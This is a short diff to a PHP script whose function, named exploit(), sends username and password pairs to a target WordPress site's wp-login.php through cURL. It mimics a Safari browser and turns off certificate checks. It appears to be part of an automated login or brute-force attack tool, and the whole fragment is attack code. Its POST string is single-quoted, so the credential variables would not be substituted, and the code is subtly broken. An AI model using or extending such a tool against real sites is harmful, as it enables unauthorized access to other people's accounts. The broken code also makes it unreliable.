@@ -1,13 +1,12 @@
 <?php
-include '../random-useragent.php';
-function exploit($url){
+function exploit($url,$user,$pass){
 	$setopt = array(
-		CURLOPT_URL => $url,
+		CURLOPT_URL => $url.'/wp-login.php',
 		CURLOPT_RETURNTRANSFER => true,
 		CURLOPT_POSTFIELDS => 'log=$user&pwd=$pass&wp-submit=LogIn&redirect_to=$url/wp-admin/',
 		CURLOPT_TIMEOUT => 60,
 		CURLOPT_CONNECTTIMEOUT => 60,
-		CURLOPT_USERAGENT => getUserAgent(),
+		CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5',
 		CURLOPT_SSL_VERIFYHOST => false,
 		CURLOPT_SSL_VERIFYPEER => false,
 	);
